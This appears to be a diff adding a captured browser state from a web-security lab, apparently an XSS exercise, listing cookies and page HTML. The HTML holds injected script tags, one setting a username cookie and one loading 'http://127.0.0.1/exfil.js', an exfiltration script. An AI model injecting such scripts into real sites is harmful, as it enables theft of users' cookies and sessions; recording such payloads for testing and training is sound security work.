@@ -1,0 +1,8 @@
+Cookie:
+language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=e1O4ZaREB8Q3od1wtbTpFRikyuEefrJS5JFDzcJaUR6h7j0zkr6bl2VwPpXy; username=Max Brown
+URL: 
+undefined
+DOM HTML:
+<head></head><body>
+    <script>document.cookie = "username=Max Brown";</script>
+    <script src="http://127.0.0.1/exfil.js"></script></body>
